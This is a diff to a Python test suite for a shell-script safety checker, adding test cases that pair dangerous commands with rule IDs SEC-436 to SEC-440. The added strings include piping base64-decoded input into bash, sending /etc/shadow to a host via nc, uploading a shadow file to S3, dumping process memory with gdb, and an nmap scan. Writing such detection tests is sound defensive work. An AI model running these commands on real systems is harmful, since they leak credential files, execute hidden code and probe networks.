@@ -557,6 +557,11 @@ class TestSafetyChecks:
             ("cd() { cd /tmp; }\n", "SEC-433"),
             ("echo \x1b[31m evil\n", "SEC-434"),
             ("trap rm EXIT\n", "SEC-435"),
+            ("echo aGVsbG8= | base64 -d | bash\n", "SEC-436"),
+            ("cat /etc/shadow | nc host 4444\n", "SEC-437"),
+            ("aws s3 cp shadow s3://bucket\n", "SEC-438"),
+            ("gdb -batch -c dump 1234\n", "SEC-439"),
+            ("nmap -sS 192.168.1.1\n", "SEC-440"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
